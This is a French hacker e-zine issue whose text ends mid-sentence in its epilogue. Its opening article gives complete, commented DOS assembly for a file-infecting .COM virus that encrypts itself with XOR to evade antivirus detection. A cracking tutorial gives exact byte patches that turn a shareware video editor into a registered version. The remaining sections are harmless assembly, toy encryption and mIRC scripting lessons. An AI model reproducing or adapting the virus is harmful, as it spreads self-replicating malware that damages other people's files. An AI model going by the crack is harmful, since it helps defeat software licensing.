@@ -1,0 +1,883 @@
+                          *-----------------------*
+                         **Malicia Production Zine**
+                          *-----------------------*
+                                  NuMbEr 3
+
+
+Introduction:
+ÄÄÄÄÄÄÄÄÄÄÄÄÄ
+Toujours plus chiant, plus emmerdant, plus rageant, plus ininteressant, plus
+ennuyant......voila Malicia Production Zine 3... ;). Bon on continue nos
+anneries habituelles avec pour les virus, la technique d'encryption. On
+continue aussi les cours de cracking avec un nouveau sch‚ma de protection.
+Pour l'asm on fait le point et on finit avec un groz article. De plus
+je vous refourge encore un cours d'encryptage avec l'explication sur
+comment casser le fichier de la semaine derniŠre ;). Et pour finir
+dans la misŠre je vous propose un ptit cours de scripting...
+
+Bon sinon n'h‚sitez pas … distribu‚ ce zine, ‡a servira ptˆt de
+couverture … un pauvre dans la rue si vous l'imprimez...
+
+freaking@caramail.com
+
+<SaTaNiK>
+
+Sommaire:
+ÄÄÄÄÄÄÄÄÄ
+
+ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+³                  Titre de l'article:                   ³   Sujet:    ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ Virus: Encryption                                      ³ Virii       ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ Cours de Cracking 3                                    ³ Cracking    ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ Initiation … l'asm 3                                   ³ Asm         ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ Initiation au cryptage 3                               ³ Cryptage    ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ Initiation au Scripting                                ³ Scripting   ³
+ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+
+
+******************************************************************************
+*               MM      MM        AA     L     I CCCCCC I    AA              *
+*              M  M    M  M      A  A    L     I C      I   A  A             *
+*             M    M  M    M    AAAAAA   L     I C      I  AAAAAA            *
+*            M      MM      M  A      A  LLLLL I CCCCCC I A      A           *
+******************************************************************************
+                     <--------------------------------->
+                              Virus: Encryption
+                     <--------------------------------->
+
+Encrypter des virus??? Mais pourquoi faire??? Et bien pour la simple raison
+qu'il y a des anti-virus(de plus en plus) qui detectent les codes qui
+ressemblent … des virus....donc on camoufle tout ‡a pour pas que le m‚chant
+anti-virus d‚truise notre gentil virus ;)). La seconde raison c pour
+camoufler la signature:
+***********************************************
+copyright db 'Liberty of ExPrEsSiOn by SaTaNiK'
+***********************************************
+Car elle pourrait servir … detecter le virus dans le fichier...
+
+Personnelement la m‚thode que j'utilise dans le virus ‡i-dessous n'est pas la
+meilleure car elle n‚c‚ssite un buffer, mais c'est la seule m‚thode que j'ai
+trouv‚ pour crypter tout le code viral en entier...enfin si vous avez
+une meilleure m‚thode n'h‚sitez pas ;).
+
+Sinon j'utilise aussi une variable Crypted qui est … 0 dans la version
+originale du virus car il n'est pas crypt‚...elle est mise … 1 en m‚moire
+avant que le virus s'encrypte et s'‚crive...
+
+La m‚thode utilis‚ par le virus est un simple xor...Ha autre chose, si vous
+regardez le code du virus, je n'encrypte ‚videmment pas l'index(encryption)
+qui xor car sinon tout serait incorrect :).
+
+******************************************************************************
+code segment
+; SEGMENT DE CODE
+        assume cs:code,ds:code
+;CS ET DS POINTENT TOUT LES 2 SUR CODE
+        org 100h
+;LES FICHIER COM COMMENCENT A 100H
+
+debut:
+        db 0e9h,0,0          ;C'EST LE JUMP, NOUS EN AVONS BESOIN POUR
+                             ;FAIRE COMME SI LE PROGRAMME ETAIT
+                             ;INFECTE
+
+virus:
+        call depart_virus    ;POURQUOI UN CALL ET BIEN TOUT SIMPLEMENT
+                             ;POUR SAVOIR A QU'ELLE ADRESSE LE PROGRAMME
+                             ;DEVRA REVENIR EN CAS DE RET(LA VALEURE EST
+                             ;MISE SUR LA PILE)
+
+depart_virus:
+        pop bp                      ;RECUPERE JUSTEMENT CETTE VALEURE
+        sub bp,OFFSET depart_virus  ;ET LA SOUSTRAIT A L'ADRESSE DE DEPART
+                                    ;VIRUS POUR OBTENIR LE DEBUT DU CODE
+                                    ;DU VIRUS...
+
+        cmp [bp+crypted],0          ;VERIFIE SI LE FICHIER EST CRYPTE
+        je remet_3_bytes
+
+        mov cx,end_virus-remet_3_bytes  ;CALCULE LA LONGUEUR DU DECRYPTAGE
+
+        lea bx,[bp+remet_3_bytes]       ;POINTE SUR LE CODE CRYPTE
+
+        mov al,[bp+encryption]          ;MET LE CODE D'ENCRYPTION DANS AL
+
+        decrypte:                       ;BOUCLE DE DECRYPTAGE
+        xor byte ptr [bx],al            ;XOR POUR DECRYPTER
+        inc bx                          
+        loop decrypte
+
+remet_3_bytes:
+        mov cx,3                    ;VA DEPLACER 3 OCTETS
+        lea  si,[bp+OFFSET troisbytes] ;MET DANS SI LES 3 BYTES ORIGINAUX
+        mov  di,100h                ;MET A 100h(EN MEMOIRE LES COMS COMMENCENT
+                                    ;A 100h...)
+        rep movsb                   ;REMET LES OCTETS ORIGINAUX
+
+init_dta:
+        lea  dx,[bp+OFFSET dta_place]  ;MET DANS DX L'ADRESSE DE hide_dta
+        mov  ah,1ah                    ;FONCTION 1Ah
+        int  21h                       ;LANCE L'INTERRUPTION
+
+trouve:
+        mov  ah,4eh                    ;PREMIERE RECHERCHE
+        lea  dx,[bp+comsig]            ;MET LE NOM DU FICHIER QU'ON CHERCHE
+                                       ;DANS DX(ici *.com)
+        mov  cx,7                      ;RECHERCHE UN FICHIER AVEC N'IMPORTE
+                                       ;QUELLE ATTRIBUTS...
+
+cherche:
+        int 21h                        ;LANCE LA RECHERCHE
+        jnc ouvre                      ;SI FICHIER TROUVE SAUTE A ouvre
+        jmp fin_cherche                ;SINON VA A fin_cherche
+
+ouvre:
+        mov  ax,3d02h                     ;FONCTION 3Dh
+        lea  dx,[bp+OFFSET dta_place+1eh] ;DTA_PLACE+1eh CONTIENT LE NOM
+                                          ;DU FICHIER TROUVE
+        int  21h                          ;LANCE L'INTERRUPTION
+        mov bx,ax                         ;MET BX DANS AX
+
+
+        mov  ah,3fh                       ;LIT LES 3 BYTES QUI VONT CHANGE
+        lea  dx,[bp+troisbytes]           ;ET PIS LES MET DANS troisbytes
+        mov  cx,3
+        int  21h                          ;EFFECTUE LA LECTURE
+
+
+        mov  ax,word ptr [bp+dta_place+1ah]  ;MET DANS AX LA TAILLE DU FICHIER
+        mov  cx,word ptr [bp+troisbytes+1]      ;MET DANS CX LES 2 DERNIERS BYTES
+                                             ;DU JUMP DONC LA TAILLE DU
+                                             ;FICHIER SI INFECTE
+        add  cx,real_end-virus+3            ;Y AJOUTE LA TAILLE DU VIRUS
+        cmp  ax,cx                           ;COMPARE LES 2
+        jz   ferme                           ;SI EGALE ALORS INFECTE
+
+
+        sub  ax,3                            ;ENLEVE TROIS A LA TAILLE
+                                             ;CAR NOUS LES AVONS DEJA LUS
+        mov  word ptr [bp+newjump+1],ax      ;MET DANS LES 2 DERNIERS BYTES
+                                             ;DE NEWJUMP LA TAILLE DU FICHIER
+                                             ;ET DONC CALCULE LE SAUT QUI
+                                             ;REMPLACERA LES 3 bytes
+
+
+        mov ax,4200h                         ;VA AU DEBUT DU FICHIER
+        xor cx,cx
+        xor dx,dx
+        int 21h
+
+
+        mov ah,40h                           ;ET ECRIT LES 3 BYTES  
+        mov cx,3
+        lea dx,[bp+newjump]
+        int 21h
+
+
+        mov ax,4202h                         ;VA A LA FIN DU FICHIER 
+        xor cx,cx
+        xor dx,dx
+        int 21h
+
+        push bx                          ;SAUVEGARDE LE HANDLE DU FICHIER
+             
+        mov [bp+crypted],1               ;LE FICHIER SERA CRYPTE
+
+        lea si,[bp+remet_3_bytes]        ;COPIE TOUT CE QUI EST A CRYPTE
+        lea di,[bp+Buffer]               ;DANS LE BUFFER
+        mov cx,end_virus-remet_3_bytes   
+        rep movsb
+
+        mov cx,end_virus-remet_3_bytes   ;TAILLE DU CODE A CRYPTE
+        lea bx,[bp+Buffer]
+        inc [bp+encryption]
+        mov al,[bp+encryption]
+
+        crypt_for_your_pleasure:         ;CRYPTE LE FICHIER
+        xor byte ptr [bx],al
+        inc bx
+        loop crypt_for_your_pleasure
+
+        pop bx                           ;RECUPERE LE HANDLE FICHIER
+
+        mov ah,40h                           ;ECRIT LE DEBUT DU VIRUS
+        mov cx,remet_3_bytes-virus           ;QUI N'EST PAS CRYPTE
+        lea dx,[bp+virus]                    
+        int 21h
+
+        mov ah,40h                           ;ECRIT LE CODE
+        mov cx,end_virus-remet_3_bytes       ;CRYPTE
+        lea dx,[bp+Buffer]                   
+        int 21h
+
+        mov ah,40h                           ;ECRIT LES VARIABLES
+        mov cx,real_end-end_virus            ;NECESSAIRES AU DECRYPTAGE...
+        lea dx,[bp+end_virus]                
+        int 21h
+
+ferme:
+        mov  ah,3eh                          ;FERME LE FICHIER
+        int  21h
+
+        mov  ah,4fh                          ;CHERCHE PROCHAIN FICHIER
+        jmp  cherche            
+
+fin_cherche:
+
+        mov  dx,80h                          ;REMET LE DTA A SA PLACE ;)
+        mov  ah,1ah
+        int  21h
+
+        mov di,100h                          ;CONTINUE LE COM NORMALEMMENT
+        jmp di
+        
+
+comsig db '*.com',0
+troisbytes db 0cdh,20h,0
+newjump db 0e9h,0,0
+copyright db 'Liberty of ExPrEsSiOn by SaTaNiK'  ;SIGNATURE ;)
+message db 'Fuck Policians!!!!'                  ;UN PTIT MESSAGE :))
+
+end_virus label near
+
+encryption db 33h                                ;INDEX D'ENCRYPTION
+crypted db 0
+Buffer db end_virus-remet_3_bytes dup (0)        ;BUFFER POUR LES DONNES
+                                                 ;CRYPTES
+real_end label near
+
+dta_place db 42 dup (?)
+
+code    ENDS
+        END    debut
+******************************************************************************
+
+Bon voil…, notre virus est de plus en plus volumineux, mais 574 octect ‡a
+va encore ;)). Bon sinon la variable encryption est incr‚ment‚ … chaque
+generation(chaque nouvelle infection) pour que le cryptage change … chaque
+fois.
+
+J'ai reflechit au moyen de se passer du buffer(ce qui double presque la taille
+du virus) et un moyen bien sympa serait d'utiliser la m‚moire vid‚o
+comme buffer, ce qui diminuerait la taille du buffer et ne devrait pas
+poser de problˆme....c'est pas difficile … faire, si vous codez un virus
+utilis‚ plut“t cette technique :).
+
+<SaTaNiK>
+
+******************************************************************************
+*               MM      MM        AA     L     I CCCCCC I    AA              *
+*              M  M    M  M      A  A    L     I C      I   A  A             *
+*             M    M  M    M    AAAAAA   L     I C      I  AAAAAA            *
+*            M      MM      M  A      A  LLLLL I CCCCCC I A      A           *
+******************************************************************************
+                              CoUrS dE CrAcKiNg
+                           *-*-*-*-*-*-*-*-*-*-*-*
+
+
+        Eh oui je continue, et cette fois nous allons attaquer un sch‚ma de
+protection encore assez utilis‚ et COMPLETEMENT STUPIDE!!!!
+
+Comme d'ab:
+
+-Softice V3.2
+La meilleure arme du crackeur
+
+W32Dasm V8.9
+Le meilleur bouclier du crackeur
+
+        Bon cette fois nous allons nous attaquer … un programme qui s'apelle
+Personal Avi Editor V1.5 qui est en fait une sorte de Adobe Premiere mais
+beaucoup moins puissant, un outils pour manipuler les videos quoi....
+
+        Bon premier r‚flexe du crackeur, on d‚sassemble Pae.exe pour avoir
+Le programme vu dans son ensemble et on regarde et recherche les choses
+interessantes...Premiere chose allons dans string reference, voyons:
+'Your Trial and Registration has expired'. Interessant mais il existe
+plusieurs r‚f‚rences donc ce n'est pas la bonne solution...Dialog references
+, Menu references, rien d'interessant l… non plus...D‚cidemment W32Dasm ne
+d‚sassemble pas si bien que ‡a :)).
+
+        La chose n'ayant pas port‚ ses fruits on va utiliser une autre
+m‚thode, nous allons augmenter la date de windoz pour que le message de
+Cit‚ plus haut apparaisse, on essaye et....‡a marche! Bon nous allons
+ici utiliser un outils offert avec Softice qui est le Symbol Loader, ce
+programme permet de lancer softice dŠs le d‚marrage du programme...Donc vous
+allez dans Fichier->Open Module et vous choisisez Pae.exe. Une fois cette
+op‚ration ‚ff‚ctu‚ vous allez dans Module->Load, il vous demanderas si vous
+ˆtes sur de vouloir le lancer et vous r‚pondez oui bien sur :).
+
+        A partir de ce point la softice apparait(magique :) et vous tracez
+dans le programme comme un fou jusqu'a ce qu'apparraise la boite de dialogue
+, la vous cliquez sur Ok et softice apparait. Maintenant vous regardez
+l'endroit auquel vous vous trouvez et vous observez le code qui pr‚c‚de:
+*******************************************************************
+cmp byte ptr [4E9A], 00       ;compare la m‚moire 4E9A avec 00
+je 7E76                       ;si ‚gal le nag-screen n'apparait pas
+<ici code pour le nag-screen>
+*******************************************************************
+
+        Si vous avez lu mes 2 premiers tutorials vous vous dŒtes bah on
+va changer ce ptit je en jmp et op plus de probl‚me...mais si vous faites
+‡a, certe plus de time-limit mais toujours en version Shareware...hmmm ce
+n'est pas des plus int‚ressant...Regardons plut“t la comparaison, donc si
+4E9A est ‚gal … 0 plus de nag-screen, interessant ‡a...Mais ou donc est
+initialis‚ la valeure de 4E9A???
+
+        Pour le savoir, rien de plus simple, vous allez dans W32Dasm, vous
+cliquez sur Search->Find Text et vous regardez...Vous tombez dŠs la premiŠre
+fois sur qqchose de trŠs interessant:
+********************************************************
+mov byte ptr [4E9A], al    ;met le registre al dans 4E9A
+xor ax,ax                  :met ax … 0
+********************************************************
+
+        Et alors l…, comme dans un rˆve, la solution ‚blouissante apparait
+aux yeux du crackeurs: Si 4E9A est … 0 plus de nags screen...et donc si
+nous inversons les 2 deux instructions 4E9A est … 0!!!!!
+
+        Il suffit donc de changer les bytes suivants:
+A2-9A-4E-31-C0
+        en
+31-C0-A2-9A-4E
+
+        Nous relen‡ons donc le logiciel et l… hooooooo miracle le logiciel
+n'a non seulement plus de nag-screen mais le logiciel est en version
+enregistr‚!!!!!!!
+
+        Ceci est vraiment le sch‚ma de protection le plus imb‚cile que j'ai
+rencontr‚(enfin Moray ‚tait pas mal non plus)...… croire que les programmeurs
+ont voulu donner la solution en main aux crackeurs ;)).
+
+<SaTaNiK>
+******************************************************************************
+*               MM      MM        AA     L     I CCCCCC I    AA              *
+*              M  M    M  M      A  A    L     I C      I   A  A             *
+*             M    M  M    M    AAAAAA   L     I C      I  AAAAAA            *
+*            M      MM      M  A      A  LLLLL I CCCCCC I A      A           *
+******************************************************************************
+                               &&&&&&&&&&&&&
+                               *Cours d'asm*
+                               *     3     *
+                               &&&&&&&&&&&&&
+
+
+Cette fois ‡i je vais ‚tudier ce qu'il nous reste comme fonctions diverses
+et vari‚s en asm...… vrais dire pas mal ;). Mais tout d'abord je voudrais
+vous parlez de qqchose d'assez important:
+
+*************
+*indicateurs*
+*************
+Les indicateurs se trouvent en fait dans un registre, le registre d'ˆtat...
+ces indicateurs, sont tout le temps modifi‚s par les fonctions...par exemple
+quand vous faŒtes un cmp ax,bx et bien un indicateur est modifi‚ en
+cons‚quence du r‚sultat...et les jumps divers(je, jb...) ne font en fait
+que tester ces indicateurs...j'avais besoin de faire cette mise au point
+pour aller dans un raisonnement plus clair de l'asm... :) Ha une derniŠre
+chose, comme vous vous en doutez surement les indicateurs sont sur 1 bit
+donc soit 1 soit 0...
+
+******
+*loop*
+******
+Loop est tout simplement un instruction pour faire une boucle(et oui ‡a
+existe aussi en asm c trucs l… ;). Vous mettez dans cx le nombre d'iterations
+un label, vos intructions et pis loop label.....
+ex:
+----------------------------------------------------------------
+mov cx,5             ;Met 5 dans cx(il va faire la boucle 5 fois
+xor ax,ax            ;Met ax … 0
+jolie_boucle:        ;Le label
+inc ax               ;Incremente(+1) eax
+loop jolie_boucle    ;Faite une belle boucle
+                     ;ax=5 maintenant
+----------------------------------------------------------------
+
+*****
+*rep*
+*****
+Rep est une instruction pour......r‚peter ;). En fait ‡a marche … peu prŠs
+comme loop sauf que une seule instruction peut ˆtre r‚p‚t‚e...mais il existe
+des sous-types dans le rep...
+Repz est celui dont on se sert le plus souvent car il permet de comparer
+les chaines de caractŠre accompagn‚ de l'instruction cmpsb.
+ex:
+-------------------------------------------
+mov cx,8             ;TESTE 8 CARACTERES
+lea si,chaine1       ;POINTE SUR CHAINE1
+lea di,chaine2       ;POINTE SUR CHAINE2
+repz cmpsb           ;REPETE TANT QUE CX!=0
+                     ;OU QUE ZF==1
+jz chaine_egales
+-------------------------------------------
+
+Houla, ‡a se complexe, mais quesque que ce ZF???? Et bien c'est tout
+simplement un indicateur...en fait la fonction cmpsb compare les pointeurs
+si et di et quand elle trouve un diffŠrence elle met cet indicateur … 0
+donc … la fin de la fonction si aucune diffŠrence n'a ‚t‚ trouv‚ ce
+registre sera toujours … 1 et donc jz qui teste cet indicateur fera le saut.
+(oufffffff j'ai r‚ussi ;)).
+
+************
+*inc et dec*
+************
+Inc et dec permettent respectivement d'augmenter de 1 ou de soustraire un
+… un registre....
+
+*******
+*movsb*
+*******
+Movs deplace la valeur point‚ par DS:SI … celle point‚ par ES:DI...movsb
+deplace un octect...movsw deplace un mot(2 octects) et movsd deplace un
+double mot(4 octets).
+
+*******
+*cmpsb*
+*******
+Mˆmme chose ici, cmpsb compare la valeure point‚ par DS:SI … celle point‚
+par ES:DI....et ici aussi il y a cmpsw et cmpsd....
+
+*****
+*mul*
+*****
+Mul multiplie la variable eax par celle pr‚cis‚ aprŠs mul...rien de bien
+compliqu‚ en fait
+ex:
+---------------------------------------
+mov eax,2    ;Met dans eax la valeure 2
+mul 5        ;Multiplie par 5
+             ;eax contient 10
+---------------------------------------
+
+*****
+*div*
+*****
+Div fonctionne de la mˆmme fa‡on que mul except‚ que le reste est plac‚
+dans edx.....
+
+*********
+*add&sub*
+*********
+Add et sub permettent d'......ajouter de de soustraire(non? vous aviez
+devin‚?).
+ex:
+--------
+add ax,3
+sub ax,1
+--------
+
+Bon voil… qui est suffisant et qui vous suffira je pense, ‚videmment l'asm
+dispose de beaucoup plus de fonctions mais elles ne sont pas toutes trŠs
+interessantes.....mais si vous desirez en savoir plus je vous conseille
+d'acheter un bouquin ;).
+
+<SaTaNiK>
+******************************************************************************
+*               MM      MM        AA     L     I CCCCCC I    AA              *
+*              M  M    M  M      A  A    L     I C      I   A  A             *
+*             M    M  M    M    AAAAAA   L     I C      I  AAAAAA            *
+*            M      MM      M  A      A  LLLLL I CCCCCC I A      A           *
+******************************************************************************
+                      !!**------------------------**!!
+                      **!!Initiation au cryptage 3!!**
+                      !!**------------------------**!!
+
+D'abord je vais vous expliquer comment decrypter le fichier de la derniŠre
+fois...en fait c'‚tait trŠs simple … cause de ‡a:
+*************************************
+for(index=0;index<10;index++)
+{
+    buffer[index]=Signature[index];
+    buffer[index2]+=good_key[index2];
+    crypt^=Signature[index2++];
+    if(index2==10)
+    {
+        index2=0;
+    }
+    crypt+=Signature[index2];
+    buffer[index]^=crypt;
+}
+*************************************
+Pourquoi? et bien tout simplement car nous connaissons les 10 premiers
+caractŠres du fichier, et ils nous permettent de r‚cuperer le code =).
+Et oui nous connaissons Signature!!! pour r‚cuperer le code il suffit donc de
+faire:
+****************************************
+    for(index=0;index<10;index++)
+    {
+        crypt^=Signature[index2++]; //xor crypte comme dans original
+        if(index2==10)
+        {
+            index2=0;
+        }
+        crypt+=Signature[index2];   //ajoute la signature comme dans
+                                    //l'original
+
+        buffer[index]^=crypt;       //Xor le buffer(inverse original)
+        buffer[index]-=Signature[index];   //Et lui soustrait Signature
+        good_key[index]=buffer[index];     //Met la cl‚ dans good_key
+    }
+****************************************
+Plut“t simple non :)? AprŠs le reste est plut“t fa‡ile....mais enfin je vous
+met quand mˆmme la source du decrypteur car j'ai fait moi mˆmme qques erreurs
+en le codant(enfin l… y en a plus ;).
+******************************************************************************
+#include <process.h>
+#include <string.h>
+#include <iostream.h>
+#include <conio.h>
+#include <ctype.h>
+#include <stdio.h>
+#include <malloc.h>
+
+void main(int argc, char *argv[])
+{
+    unsigned long taille;
+    unsigned long index;
+    unsigned char *buffer;
+    unsigned char index2;
+    unsigned char Signature[10];
+    unsigned char good_key[50];
+    unsigned char crypt=33;
+    FILE *to_crypt;
+    FILE *crypted;
+
+    printf("Spiritic DeCrypter By SaTaNiK V0.2\n\n");
+    if(argc!=3)
+    {
+        printf("Usage:\n");
+        printf("Crypter <source_file> <decrypted_file>\n");
+        exit(0);
+    }
+
+    to_crypt=fopen(argv[1],"r+b");
+    if(to_crypt==NULL)
+    {
+        printf("Can't open source file...\n");
+        exit(1);
+    }
+
+    crypted=fopen(argv[2],"wb");
+    if(crypted==NULL)
+    {
+        printf("Can't create crypted file...\n");
+        exit(1);
+    }
+
+    for(index=0;index<50;index++)
+    {
+        good_key[index]=0;
+    }
+
+    try_again:
+
+    fseek(to_crypt,0,SEEK_END);
+    taille=ftell(to_crypt);
+    fseek(to_crypt,0,SEEK_SET);
+    buffer=(unsigned char *)malloc((taille+10));
+    if(buffer==NULL)
+    {
+        printf("Can't allocate enough memory...\n");
+        exit(1);
+    }
+
+    printf("I'm decrypting master...\n");
+    index2=0;
+    Signature[0]='S';
+    Signature[1]='p';
+    Signature[2]='i';
+    Signature[3]='r';
+    Signature[4]='i';
+    Signature[5]='t';
+    Signature[6]='i';
+    Signature[7]='c';
+    Signature[8]='C';
+    Signature[9]='r';
+
+    fread(buffer,1,10,to_crypt);
+    
+    for(index=0;index<10;index++)
+    {
+        crypt^=Signature[index2++];
+        if(index2==10)
+        {
+            index2=0;
+        }
+        crypt+=Signature[index2];
+        buffer[index]^=crypt;
+        buffer[index]-=Signature[index];
+        good_key[index]=buffer[index];
+    }
+
+    for(index=0;index<taille-10;index++)
+    {
+        buffer[index]=(unsigned char)getc(to_crypt);
+        crypt^=Signature[index2++];
+        if(index2==10)
+        {
+            index2=0;
+        }
+        crypt+=Signature[index2];
+        buffer[index]^=crypt;
+        if(index2!=0)
+        {
+            buffer[index]-=good_key[index2-1];
+        }
+        else
+        {
+            buffer[index]-=good_key[9];
+        }
+    }
+    
+
+    fwrite(buffer,1,taille-10,crypted);
+
+    printf("File decrypted successfully :)\n");
+
+    exit(0);
+}
+******************************************************************************
+
+Bon voil… donc pour decrypter le fichier de la derniŠre fois vous tapez:
+decrypter Hello.cry Hello.dec
+Et puis vous obtenez un b“ resultat(sisi ‡a marche ;).
+
+Bon sinon pour les codeurs endur‡i que nous sommes j'ai pr‚vu un autre
+encrypteur, beaucoup plus dur … casser vous pouvez me croire ;).
+******************************************************************************
+#include <process.h>
+#include <string.h>
+#include <iostream.h>
+#include <conio.h>
+#include <ctype.h>
+#include <stdio.h>
+#include <malloc.h>
+
+void main(int argc, char *argv[])
+{
+    //DES VARIABLES DIVERSES...
+    unsigned long taille;
+    unsigned long index;
+    unsigned char *buffer;
+    unsigned char index2;
+    unsigned char good_key[50];
+    unsigned char table[100];
+    unsigned char crypt=33;
+    FILE *to_crypt;
+    FILE *crypted;
+
+    //PRESENTATION
+    printf("Spiritic Crypter By SaTaNiK V0.2\n\n");
+    //IL N'AS PAS RENTREE 3 ARGUMENTS....
+    if(argc!=3)
+    {
+        printf("Usage:\n");
+        printf("Crypter <source_file> <crypted_file>\n");
+        exit(0);
+    }
+
+    //OUVRE LE FICHIER A CRYPTE
+    to_crypt=fopen(argv[1],"r+b");
+    if(to_crypt==NULL)
+    {
+        printf("Can't open source file...\n");
+        exit(1);
+    }
+
+    //OUVRE LE FICHIER CRYPTE
+    crypted=fopen(argv[2],"wb");
+    if(crypted==NULL)
+    {
+        printf("Can't create crypted file...\n");
+        exit(1);
+    }
+
+    //DEMANDE LA CLEE
+    try_again:
+    for(index=0;index<50;index++)
+    {
+        good_key[index]=0;
+    }
+    printf("Enter the magic key:\n");
+    cin >> good_key;
+    if(good_key[9]==0)
+    {
+        printf("You don't enter a good key...\n");
+        printf("Are you completely stupid????\n");
+        printf("I give you another chance...\n");
+        goto try_again;
+    }
+
+    fseek(to_crypt,0,SEEK_END);
+    taille=ftell(to_crypt);
+    fseek(to_crypt,0,SEEK_SET);
+    buffer=(unsigned char *)malloc((unsigned int)taille);
+    if(buffer==NULL)
+    {
+        printf("Can't allocate enough memory...\n");
+        exit(1);
+    }
+
+    index2=0;
+    printf("Generating Table...\n");
+    for(index=0;index<100;index++)
+    {
+        table[index]=(unsigned char)index;
+        crypt^=(unsigned char)(255-index);
+        table[index]*=good_key[index2++];
+        if(index2==10)
+        {
+            index2=0;
+        }
+        table[index]-=crypt;
+    }
+        
+
+    printf("I'm crypting master...\n");
+    
+    fwrite("Spiritic Crypter",1,16,crypted);
+
+    fread(buffer,1,(unsigned int)taille,to_c    rypt);
+
+    index2=0;
+    
+    for(index=0;index<taille;index++)
+    {
+        buffer[index]^=table[index2++];
+        if(index2==100)
+        {
+            index2=0;
+        }
+    }
+
+    fwrite(buffer,1,(unsigned int)taille,crypted);
+
+    printf("File crypted successfully :)\n");
+
+    exit(0);
+}
+******************************************************************************
+Bon bein voil… :). Si qqun arrive … decrypter le fichier
+Hello.cry qui se trouve avec le mag qu'il le dise ;). Sinon j'expliquerai
+comment le casser la prochaine fois :).
+
+<SaTaNiK>
+
+******************************************************************************
+*               MM      MM        AA     L     I CCCCCC I    AA              *
+*              M  M    M  M      A  A    L     I C      I   A  A             *
+*             M    M  M    M    AAAAAA   L     I C      I  AAAAAA            *
+*            M      MM      M  A      A  LLLLL I CCCCCC I A      A           *
+******************************************************************************
+                                -----------
+                            ***//Scripting\\**
+                                -----------
+
+        Ici nous allons parler de script, et plus exactement comment en
+‚crire =). J'‚cris cet article car je sais que pas mal de gens aimerait si
+mettre...et qu'ils ne savent pas trop comment, alors moi je m'y suis mit
+et pis c pas bien compliquer...enfin vous allez voir ;).
+
+        La premiŠre chose … faire c'est installer la derniŠre version de
+Mirc, une version clean quoi. Bon ensuite on look les differents fichiers
+ini:
+
+*Popups.ini*
+C'est en fait le fichier qui permet de changer le menu Commands ainsi que
+ce qui apparait quand vous faŒtes un click droit sur un channel ou sur un
+nick...
+
+*Aliases.ini*
+c'est le fichier qui permet de n'utiliser qu'une commande plut“t que plusieurs
+, par exemple Mirc a … la base:
+-----------------------------
+n0=/op /mode # +ooo $$1 $2 $3
+-----------------------------
+Cela permet d'utiliser la commande /op plut“t que /mode # +ooo nick
+
+*Mirc.ini*
+Ce fichier permet beaucoup de chose car c'est le fichier principal de
+Mirc, il permet de changer le nom des fichiers Alias, Popups et tout le
+bazard, de jouer un wav quand on vous ping par exemple, ainsi de suite. Il
+permet aussi de rajouter des fichiers de commandes.....
+
+
+Bon aprŠs ces ptites descriptions, on va tout de suite am‚liorer Mirc...
+D'abord looker pour le ptit descripteur '[rfiles]'. Ensuite rajoutez une
+ligne genre:
+n2:events.ini
+ou le nom de fichier que vous voulez....
+
+Ensuite cr‚e un fichier events.ini et marquez sur la premiŠre ligne
+[script]
+ensuite on va cr‚er en fait des fonctions permanentes....c'est fonctions
+commencent toujours par n+num‚ro de ligne en comman‡ant par 0...ce chiffre
+est suivit d'un =
+
+Ensuite pour cr‚er un fonction vous mettez un di‚se(#) puis le nom de la
+fonction suivit d'un espace et de on ou off selon que vous vouliez qu'elle
+soit en marche ou pas au moment ou le script d‚marre...
+
+A la fin de la fonctions vous mettez si vous devez signaler … Mirc que la
+fonction est finit:
+n(ligne)=#nom_de_fonction end
+
+Bon pour simplifier la chose je vous donne ici un exemple de fichier
+events.ini:
+******************************************************************************
+[script]
+n0=#ldetect on
+n1=on 1:TEXT:*salut*:#:/notice $nick Salut man!!!!
+n2=#ldetect end
+******************************************************************************
+Ce bout de script … pour effet de faire un notice sur qqun quand il dit
+salut dans un phrase....plut“t simple non??? Ce script est on tout le temps
+je vous apprendrais dans le prochain num‚ro comment le d‚sactiver et tout
+un tas de trucs sympa....
+
+<SaTaNiK>
+******************************************************************************
+*               MM      MM        AA     L     I CCCCCC I    AA              *
+*              M  M    M  M      A  A    L     I C      I   A  A             *
+*             M    M  M    M    AAAAAA   L     I C      I  AAAAAA            *
+*            M      MM      M  A      A  LLLLL I CCCCCC I A      A           *
+******************************************************************************
+
+                                 ********
+                                "Epilogue"
+                                 ********
+
+        Et voil… encore un num‚ro de finit dans l'allegresse de la rentr‚e ;).
+Sinon je voudrais faire un mega-greet … tout ceux qui font des freeware et …
+ceux qui distribuent des musiques gratuitement(fuck Mp3z)......et oui
+quesque vous voulez, je prefere ce qui est gratuit surtout quand c'est de
